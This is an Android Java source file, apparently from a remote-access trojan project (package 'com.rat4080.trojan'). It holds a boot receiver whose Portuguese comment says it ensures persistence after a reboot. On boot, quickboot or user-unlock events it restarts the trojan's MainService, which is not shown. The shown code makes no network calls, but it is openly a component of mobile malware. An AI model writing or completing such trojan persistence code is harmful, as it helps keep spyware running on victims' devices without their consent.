package com.rat4080.trojan;

import android.content.*;
import android.os.Build;
import android.util.Log;

/**
 * Garante persistência após reboot
 */
public class BootReceiver extends BroadcastReceiver {
    
    private static final String TAG = "Rat4080Boot";
    
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        
        if (Intent.ACTION_BOOT_COMPLETED.equals(action) ||
            Intent.ACTION_USER_PRESENT.equals(action) ||
            "android.intent.action.QUICKBOOT_POWERON".equals(action) ||
            "com.htc.intent.action.QUICKBOOT_POWERON".equals(action)) {
            
            Log.i(TAG, "Boot detetado. A reiniciar serviço...");
            
            Intent serviceIntent = new Intent(context, MainService.class);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
        }
    }
}
